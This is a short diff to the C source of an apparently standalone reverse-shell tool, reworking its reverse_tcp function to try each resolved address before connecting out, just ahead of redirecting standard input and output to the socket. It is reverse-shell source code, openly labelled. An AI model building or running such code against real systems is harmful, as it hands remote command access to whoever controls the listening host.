@@ -58,8 +58,9 @@ static char *rshell_basename(char *path)
 static void reverse_tcp(const struct rshell *rshell)
 {
 	int		sockfd;
-	struct addrinfo	hints;
-	struct addrinfo	*res;
+	struct addrinfo	hints,
+			*result,
+			*rp;
 	int		ret;
 	char		*ex[3];
 
@@ -67,14 +68,33 @@ static void reverse_tcp(const struct rshell *rshell)
 	hints.ai_family = rshell->family;
 	hints.ai_socktype = SOCK_STREAM;
 
-	if ( (ret = getaddrinfo(rshell->host, rshell->service, &hints, &res)) != 0 )
+	if ( (ret = getaddrinfo(rshell->host, rshell->service, &hints, &result)) != 0 )
+	{
+		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(ret));
 		return;
+	}
 
-	if ( (sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) < 0 )
-		return;
+	/* getaddrinfo() returns a list of address structures.
+	 * Try each address until we successfully bind().
+	 */
+	for ( rp = result ; rp != NULL ; rp = rp->ai_next )
+	{
+		if ( (sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)) < 0 )
+			continue;
 
-	if ( connect(sockfd, res->ai_addr, res->ai_addrlen) < 0 )
+		if ( connect(sockfd, rp->ai_addr, rp->ai_addrlen) == 0 )
+			break;
+
+		close(sockfd);
+	}
+
+	freeaddrinfo(result);
+
+	if ( rp == NULL )
+	{
+		fprintf(stderr, "Could not bind any socket.\n");
 		return;
+	}
 
 	/* Replace stdin, stdout and stderr from the socket
 	 */
